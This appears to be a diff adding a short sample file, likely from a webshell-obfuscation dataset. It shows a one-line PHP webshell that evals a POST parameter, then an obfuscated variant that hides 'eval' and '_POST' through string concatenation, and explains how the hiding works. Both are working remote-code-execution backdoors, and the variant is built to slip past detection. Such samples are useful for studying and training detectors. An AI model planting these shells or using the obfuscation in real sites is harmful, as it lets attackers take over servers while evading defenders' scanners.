@@ -1,0 +1,15 @@
+Original webshell sample:
+
+'''
+<?php @eval($_POST['110']);?>
+'''
+
+Webshell obtained after using the corresponding method:
+
+'''
+<?php $k="e"."v"."a"."l"; $k(${"_PO"."ST"} ['110']);?>
+'''
+
+Description:
+
+This code hides sensitive functions such as "eval" by string concatenation, copies them to the variable "$k", and hides the subsequent "_POST" keyword with a slice, and finally executes the contents of the "_POST" parameter "110" as php code.
